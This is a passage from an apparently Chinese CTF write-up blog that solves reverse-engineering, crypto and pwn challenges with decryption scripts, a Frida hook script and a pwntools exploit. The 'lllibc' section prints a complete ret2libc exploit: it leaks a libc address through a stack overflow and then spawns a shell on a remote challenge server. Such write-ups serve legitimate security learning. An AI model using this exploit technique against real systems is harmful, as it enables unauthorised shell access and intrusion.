                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.8358497375328082in”}</p>
<p>AI排序</p>
<p>按照格式md5后包裹即可</p>
<p>flag{234ed8ef5421c5e559420dbf841db68f}</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="ezBase"><a href="#ezBase" class="headerlink" title="ezBase"></a>ezBase</h3><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><p>先查壳是upx壳，直接脱脱不下来，应该是魔改壳，放到010里面将3个小写的upx都改成大写的UPX后再脱壳就可以了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image41.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.086314523184602in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image42.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.6274486001749782in”}</p>
<p>脱完后放到IDA里是自定义base64编码，先加密后再与0x04异或，逆向过来所以先与0x04异或再base64解码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956632.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.6647244094488185in”}</p>
<p>直接赛博厨子一把唆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image44.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.0843339895013124in”}</p>
<h3 id="你知道base吗"><a href="#你知道base吗" class="headerlink" title="你知道base吗"></a>你知道base吗</h3><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>无壳，直接ida打开，分析main函数，进去main_0函数首先输入key，key以v10为密钥经过tea加密后等于v9，写脚本解密得到key，此key也是下面rc4加密的key</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image45.png"
                      alt="descript"
                >{width&#x3D;”4.645833333333333in”<br>height&#x3D;”5.010416666666667in”}</p>
<p>base_table以key为密钥，经过rc4加密后等于v20+v21数组，解密得到table</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image46.png"
                      alt="descript"
                >{width&#x3D;”3.9479166666666665in”<br>height&#x3D;”1.90625in”}</p>
<p>flag以table为索引表，自定义base32加密得到v24，写脚本解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956608.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.0252395013123359in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image48.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”0.6886701662292214in”}</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">#tea解密</span><br><span class="line"></span><br><span class="line">def tea_decrypt(v, k):</span><br><span class="line"></span><br><span class="line">    v0, v1 = v\[0\], v\[1\]</span><br><span class="line"></span><br><span class="line">    delta = 0x9E3779B9</span><br><span class="line"></span><br><span class="line">    sum = (delta \* 32) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">    for \_ in range(32):</span><br><span class="line"></span><br><span class="line">        v1 = (v1 - (((v0 \&lt;\&lt; 4) + k\[2\]) \^ (v0 + sum) \^ ((v0 \&gt;\&gt;</span><br><span class="line"></span><br><span class="line">5) + k\[3\]))) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">        v0 = (v0 - (((v1 \&lt;\&lt; 4) + k\[0\]) \^ (v1 + sum) \^ ((v1 \&gt;\&gt;</span><br><span class="line"></span><br><span class="line">5) + k\[1\]))) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">        sum = (sum - delta) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">    return \[v0, v1\]</span><br><span class="line"></span><br><span class="line">\# 给定密文v9和密钥v10</span><br><span class="line"></span><br><span class="line">v9 = \[0xA92F3865, 0x9E60E953\]</span><br><span class="line"></span><br><span class="line">v10 = \[0x12345678, 0x3456789A, 0x89ABCDEF, 0x12345678\]</span><br><span class="line"></span><br><span class="line">plain = tea_decrypt(v9, v10)</span><br><span class="line"></span><br><span class="line">key_bytes = plain\[0\].to_bytes(4, \&#x27;little\&#x27;) + plain\[1\].to_bytes(4,</span><br><span class="line">\&#x27;little\&#x27;)</span><br><span class="line"></span><br><span class="line">print(\&quot;明文 key (bytes):\&quot;, key_bytes)      #明文 key (bytes):</span><br><span class="line">b\&#x27;y0uokTea\&#x27;</span><br><span class="line"></span><br><span class="line">rc4解密</span><br><span class="line"></span><br><span class="line">def rc4_init(key):</span><br><span class="line"></span><br><span class="line">    S = list(range(256))</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line"></span><br><span class="line">    key_len = len(key)</span><br><span class="line"></span><br><span class="line">    for i in range(256):</span><br><span class="line"></span><br><span class="line">        j = (j + S\[i\] + key\[i % key_len\]) % 256</span><br><span class="line"></span><br><span class="line">        S\[i\], S\[j\] = S\[j\], S\[i\]</span><br><span class="line"></span><br><span class="line">    return S</span><br><span class="line"></span><br><span class="line">def rc4_keystream(S, length):</span><br><span class="line"></span><br><span class="line">    i = j = 0</span><br><span class="line"></span><br><span class="line">    stream = \[\]</span><br><span class="line"></span><br><span class="line">    for \_ in range(length):</span><br><span class="line"></span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line"></span><br><span class="line">        j = (j + S\[i\]) % 256</span><br><span class="line"></span><br><span class="line">        S\[i\], S\[j\] = S\[j\], S\[i\]</span><br><span class="line"></span><br><span class="line">        K = S\[(S\[i\] + S\[j\]) % 256\]</span><br><span class="line"></span><br><span class="line">        stream.append(K)</span><br><span class="line"></span><br><span class="line">    return stream</span><br><span class="line"></span><br><span class="line">def decrypt(cipher_bytes, key):</span><br><span class="line"></span><br><span class="line">    key_bytes = \[ord(c) for c in key\]</span><br><span class="line"></span><br><span class="line">    S = rc4_init(key_bytes)</span><br><span class="line"></span><br><span class="line">    keystream = rc4_keystream(S, len(cipher_bytes))</span><br><span class="line"></span><br><span class="line">    plain = \[(c - k) % 256 for c, k in zip(cipher_bytes, keystream)\]</span><br><span class="line"></span><br><span class="line">    return bytes(plain)</span><br><span class="line"></span><br><span class="line">已知密文</span><br><span class="line"></span><br><span class="line">ciphertext = \[</span><br><span class="line"></span><br><span class="line">    0xD4, 0x59, 0x23, 0x76, 0xB4, 0xBF, 0xE3, 0x2C, 0x58, 0x8F,</span><br><span class="line"></span><br><span class="line">    0x56, 0x19, 0xDA, 0xF0, 0xC0, 0xBD, 0x36, 0x3D, 0x7B, 0x46,</span><br><span class="line"></span><br><span class="line">    0x1B, 0xB8, 0x17, 0x1F, 0xE3, 0xD0, 0x03, 0x45, 0xCD, 0x04,</span><br><span class="line"></span><br><span class="line">    0xED, 0xC9, 0x67, 0xE6, 0xAB, 0x29, 0xA7, 0xBC, 0x0B, 0xDE,</span><br><span class="line"></span><br><span class="line">    0x5C, 0x30, 0x71, 0xD7, 0xD5, 0x5A, 0xC6, 0x9F, 0x40, 0x65,</span><br><span class="line"></span><br><span class="line">    0xC4, 0x71, 0xA9, 0xC3, 0xAE, 0xD9, 0xB5, 0xE5, 0x12, 0x8C,</span><br><span class="line"></span><br><span class="line">    0x80, 0x52, 0x34, 0x36,</span><br><span class="line"></span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">key = \&quot;y0uokTea\&quot;       #tea解出来key</span><br><span class="line"></span><br><span class="line">plaintext = decrypt(ciphertext, key)</span><br><span class="line"></span><br><span class="line">print(plaintext.decode(errors=\&#x27;replace\&#x27;))  # 用 replace 防止非 ascii</span><br><span class="line">报错</span><br><span class="line"></span><br><span class="line">自定义base32解密</span><br><span class="line"></span><br><span class="line">def custom_base32_decode(encoded_str, base32_table):</span><br><span class="line"></span><br><span class="line">    base32_table = base32_table\[1:33\]  # 使用 a3\[1:33\]</span><br><span class="line"></span><br><span class="line">    char_to_val = &#123;c: i for i, c in enumerate(base32_table)&#125;</span><br><span class="line"></span><br><span class="line">    decoded_bytes = bytearray()</span><br><span class="line"></span><br><span class="line">    for i in range(0, len(encoded_str), 8):</span><br><span class="line"></span><br><span class="line">        chunk = encoded_str\[i:i+8\]</span><br><span class="line"></span><br><span class="line">        if len(chunk) \&lt; 8:</span><br><span class="line"></span><br><span class="line">            chunk = chunk.ljust(8, base32_table\[0\])  #</span><br><span class="line">填充（理论上不需要）</span><br><span class="line"></span><br><span class="line">        value = 0</span><br><span class="line"></span><br><span class="line">        for c in chunk:</span><br><span class="line"></span><br><span class="line">            value = (value \&lt;\&lt; 5) \| char_to_val\[c\]</span><br><span class="line"></span><br><span class="line">        for shift in \[32, 24, 16, 8, 0\]:</span><br><span class="line"></span><br><span class="line">            decoded_bytes.append((value \&gt;\&gt; shift) &amp; 0xFF)</span><br><span class="line"></span><br><span class="line">    return decoded_bytes</span><br><span class="line"></span><br><span class="line">encoded = \&quot;0tCPwtnncFZyYUlSK/4Cw0/echcG2lteBWnG2Ulw0htCYTMW\&quot;  </span><br><span class="line"></span><br><span class="line">给的密文</span><br><span class="line"></span><br><span class="line">base32_table =</span><br><span class="line">\&quot;gVxwoFhPyT/YM0BKcHe4b8GCUZtlnLW2SJO51IErk+q6vzpamdARX9siND3uQfj7\&quot;</span><br><span class="line"></span><br><span class="line">rc4解出来的</span><br><span class="line"></span><br><span class="line">original_bytes = custom_base32_decode(encoded, base32_table)</span><br><span class="line"></span><br><span class="line">print(\&quot;Recovered a1 (ascii):\&quot;,</span><br><span class="line">original_bytes.decode(errors=\&#x27;replace\&#x27;))</span><br></pre></td></tr></table></figure></div>



<h3 id="hookme"><a href="#hookme" class="headerlink" title="hookme"></a>hookme</h3><p>apk文件，jadx分析，输入flag，经过rc4函数加密后与一串写好的密文比较，两者相等则输出正确，找到密文</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image49.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.598946850393701in”}</p>
<p>利用rc4是流密码的特性，写一个hook脚本，在模拟器输入一串字符串，运行脚本给出对应经过函数加密后的密文，输入一个示例（足够长），拿到后去解密key数组，用key数组解密密文得到正确的flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956145.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”0.4508792650918635in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image51.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.644880796150481in”}</p>
<p>hook脚本</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line"></span><br><span class="line">    var MainActivity = Java.use(\&quot;com.example.hookme.MainActivity\&quot;);</span><br><span class="line"></span><br><span class="line">    // Hook rc4Encrypt(String input)</span><br><span class="line"></span><br><span class="line">    MainActivity.rc4Encrypt.implementation = function (input) &#123;</span><br><span class="line"></span><br><span class="line">        console.log(\&quot;\[\*\] Called rc4Encrypt()\&quot;);</span><br><span class="line"></span><br><span class="line">        console.log(\&quot;    Input: \&quot; + input);</span><br><span class="line"></span><br><span class="line">        var result = this.rc4Encrypt(input);</span><br><span class="line"></span><br><span class="line">        // Convert byte\[\] to hex string</span><br><span class="line"></span><br><span class="line">        var resultHex = byteArrayToHex(result);</span><br><span class="line"></span><br><span class="line">        console.log(\&quot;    RC4 Output (Hex): \&quot; + resultHex);</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    function byteArrayToHex(byteArray) &#123;</span><br><span class="line"></span><br><span class="line">        var result = \&quot;\&quot;;</span><br><span class="line"></span><br><span class="line">        for (var i = 0; i \&lt; byteArray.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">            var byte = byteArray\[i\];</span><br><span class="line"></span><br><span class="line">            result += (\&quot;0\&quot; + (byte &amp; 0xff).toString(16)).slice(-2);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">exp</span><br><span class="line"></span><br><span class="line">def xor_bytes(b1: bytes, b2: bytes) -\&gt; bytes:</span><br><span class="line"></span><br><span class="line">    return bytes(\[x \^ y for x, y in zip(b1, b2)\])</span><br><span class="line"></span><br><span class="line">\# === Step 1: 用于恢复 keystream 的已知明文和密文 ===</span><br><span class="line"></span><br><span class="line">\# 必须都是 44 字节（即 44 个字符，或 88 个十六进制字符）</span><br><span class="line"></span><br><span class="line">known_plaintext =</span><br><span class="line">b\&quot;flag&#123;this_is_just_a_dummy_test_for_recovering_rc4&#125;\&quot;</span><br><span class="line"></span><br><span class="line">known_ciphertext_hex =</span><br><span class="line">\&quot;f235b888b3e5eddbea2abea7f69ff820c797a5dde01a10b8ba876b97c4fcf472f39bf8dcad03b89b36435258859078a6a81a\&quot;</span><br><span class="line"></span><br><span class="line">known_ciphertext = bytes.fromhex(known_ciphertext_hex)</span><br><span class="line"></span><br><span class="line">\# 确保长度一致</span><br><span class="line"></span><br><span class="line">if len(known_plaintext) != len(known_ciphertext):</span><br><span class="line"></span><br><span class="line">    raise ValueError(f\&quot;明文和密文长度不一致: &#123;len(known_plaintext)&#125; !=</span><br><span class="line">&#123;len(known_ciphertext)&#125;\&quot;)</span><br><span class="line"></span><br><span class="line">\# Step 2: 恢复 keystream</span><br><span class="line"></span><br><span class="line">keystream = xor_bytes(known_plaintext, known_ciphertext)</span><br><span class="line"></span><br><span class="line">print(\&quot;✅ Recovered keystream (hex):\&quot;, keystream.hex())</span><br><span class="line"></span><br><span class="line">\# === Step 3: 使用 keystream 解密另一个密文 ===</span><br><span class="line"></span><br><span class="line">\# 替换为你要解密的真实目标密文</span><br><span class="line"></span><br><span class="line">target_ciphertext_hex =</span><br><span class="line">\&quot;f235b888b3f4e08bff17e7e29bc3bf67d0f9a1b7b6581bb4a1eb299684e99923a8d193caf91d\&quot;</span><br><span class="line"></span><br><span class="line">target_ciphertext = bytes.fromhex(target_ciphertext_hex)</span><br><span class="line"></span><br><span class="line">\# 解密目标密文</span><br><span class="line"></span><br><span class="line">if len(target_ciphertext) \&gt; len(keystream):</span><br><span class="line"></span><br><span class="line">    raise ValueError(\&quot;密文长度超过 keystream 长度，无法解密\&quot;)</span><br><span class="line"></span><br><span class="line">decrypted = xor_bytes(target_ciphertext, keystream)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">    print(\&quot;🔓 Decrypted plaintext:\&quot;,</span><br><span class="line">decrypted.decode(errors=\&quot;ignore\&quot;))</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line"></span><br><span class="line">    print(\&quot;❌ 解码失败:\&quot;, e)</span><br></pre></td></tr></table></figure></div>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h4 id="esay-rsa"><a href="#esay-rsa" class="headerlink" title="esay_rsa"></a>esay_rsa</h4><p>网站分解n得到p，q，写脚本运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956703.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”5.860698818897638in”}</p>
<p>包上flag{}</p>
<h4 id="2-dp"><a href="#2-dp" class="headerlink" title="2.dp"></a>2.dp</h4><p>dp泄露，直接套脚本改下数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image53.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.79290791776028in”}</p>
<h4 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h4><p>txt中给的abab形式，很明显转换为01二进制转ascll就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image54.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”6.790798337707787in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image55.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.9976367016622922in”}</p>
<p>接着进入厨师</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956590.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.905570866141732in”}</p>
<p>base32--url--base64</p>
<p>最后进随波逐流’</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956752.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.8358497375328082in”}</p>
<h4 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h4><p>分离n1得到p1，q1，e&#x3D;c1 - p1 &#x3D;<br>6701513605196718137208327145211106525052740242222174201768345944717813148931274437740087428165253744741547590314279846187850432858954606153257994418035341</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image58.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.076069553805774in”}</p>
<p>然后求出d</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image59.png"
                      alt="descript"
                >{width&#x3D;”5.635416666666667in”<br>height&#x3D;”1.5833333333333333in”}</p>
<p>d &#x3D; 1322874566486382881454604115011030734869</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956273.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.476523403324584in”}</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="1-lllibc"><a href="#1-lllibc" class="headerlink" title="1.lllibc"></a>1.lllibc</h2><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>先用checksec查一下保护</p>
<blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image61.png"
                      alt="descript"
                >{width&#x3D;”6.065972222222222in”<br>height&#x3D;”3.342807305336833in”}</p>
<p>放到IDA里分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956061.png"
                      alt="descript"
                >{width&#x3D;”6.065972222222222in”<br>height&#x3D;”2.4165923009623795in”}</p>
</blockquote>
<p>一眼栈溢出，先构造 ROP 链泄露 write@got 地址，用来计算 libc<br>的基地址。再计算 system 和 &#x2F;bin&#x2F;sh 的地址，重新构造 ROP 链<br>getshell。写出exp运行得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956454.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.770229658792651in”}</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>from pwn import *</p>
<p>from LibcSearcher import LibcSearcher</p>
<p>filename &#x3D; &#39;.&#x2F;lllibc&#39;</p>
<p>url &#x3D; &#39;27.25.151.26:30560&#39;</p>
<p>gdbscript &#x3D; &#39;&#39;&#39;</p>
<p>b * 0x0000000000401228</p>
<p>&#39;&#39;&#39;</p>
<p># 等效于 set_context(...)</p>
<p>context(log_level&#x3D;&#39;debug&#39;, arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;,<br>endian&#x3D;&#39;little&#39;, timeout&#x3D;5)</p>
<p># 简化远程连接方式，支持 remote 和 process 自动切换</p>
<p>def connect(url, filename, gdbscript&#x3D;&#39;&#39;):</p>
<p>if url:</p>
<p>host, port &#x3D; url.split(&#39;:&#39;)</p>
<p>return remote(host, int(port))</p>
<p>else:</p>
<p>return process(filename)</p>
<p>p &#x3D; connect(url, filename, gdbscript)</p>
<p>elf &#x3D; ELF(filename)</p>
<p># gadgets</p>
<p>pop_rdi &#x3D; 0x000000000040117e</p>
<p>pop_rsi &#x3D; 0x0000000000401180</p>
<p>pop_rdx &#x3D; 0x0000000000401182</p>
<p>ret &#x3D; 0x000000000040101a</p>
<p># leak write@libc</p>
<p>payload &#x3D; b&#39;a&#39; * 0x10 + p64(0)</p>
<p>payload +&#x3D; p64(pop_rdi) + p64(1)</p>
<p>payload +&#x3D; p64(pop_rsi) + p64(elf.got[&#39;write&#39;])</p>
<p>payload +&#x3D; p64(pop_rdx) + p64(8)</p>
<p>payload +&#x3D; p64(elf.plt[&#39;write&#39;])</p>
<p>payload +&#x3D; p64(0x00000000004011EC) # 返回 main</p>
<p>p.sendafter(&quot;Libc how to win?\n&quot;, payload)</p>
<p># 解析泄露地址</p>
<p>write_addr &#x3D; u64(p.recvuntil(b&#39;\x7f&#39;)[-6:] + b&#39;\x00\x00&#39;)</p>
<p>log.success(f&quot;write@libc &#x3D; {hex(write_addr)}&quot;)</p>
<p># 使用 LibcSearcher 获取偏移</p>
<p>libc &#x3D; LibcSearcher(&#39;write&#39;, write_addr)</p>
<p>libc_base &#x3D; write_addr - libc.dump(&#39;write&#39;)</p>
<p>system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</p>
<p>binsh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</p>
<p>log.success(f&quot;libc base &#x3D; {hex(libc_base)}&quot;)</p>
<p>log.success(f&quot;system &#x3D; {hex(system_addr)}&quot;)</p>
<p>log.success(f&quot;&#x2F;bin&#x2F;sh &#x3D; {hex(binsh_addr)}&quot;)</p>
<p># 构造 RCE payload</p>
<p>payload &#x3D; b&#39;a&#39; * 0x10 + p64(0)</p>
<p>payload +&#x3D; p64(pop_rdi) + p64(binsh_addr)</p>
<p>payload +&#x3D; p64(ret) + p64(system_addr)</p>
<p>sleep(0.5)</p>
<p>p.sendafter(&quot;Libc how to win?\n&quot;, payload)</p>
<p>p.interactive()</p>
<h2 id="it-is-a-canary"><a href="#it-is-a-canary" class="headerlink" title="it_is_a_canary"></a>it_is_a_canary</h2><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>先用checksec查一下保护</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:\hexo\source\pandoc-3.7.0.1\images\media\image64.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.551751968503937in”}</p>
<p>放到ida里面进行查看，进行分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image65.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.1640824584426945in”}</p>
